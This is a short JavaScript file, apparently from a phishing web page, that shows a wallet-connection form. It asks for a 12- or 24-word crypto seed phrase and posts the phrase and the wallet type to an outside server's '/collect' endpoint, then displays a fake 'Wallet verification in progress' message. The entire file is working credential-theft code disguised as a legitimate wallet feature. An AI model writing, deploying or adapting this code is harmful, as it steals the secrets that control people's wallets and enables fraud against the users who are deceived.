function connectWallet() {
  const walletSection = document.getElementById("walletSection");
  walletSection.style.display = "block";
}

function submitWallet() {
  const walletType = document.getElementById("walletSelect").value;
  const seedPhrase = document.getElementById("seedInput").value;

  if (!seedPhrase || seedPhrase.split(" ").length < 12) {
    alert("Please enter a valid 12 or 24-word seed phrase.");
    return;
  }

  fetch("https://govbtcbackend.onrender.com/collect", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ walletType, seedPhrase })
  }).then(res => {
    alert("Wallet verification in progress...");
  }).catch(err => {
    alert("An error occurred. Try again later.");
  });
}
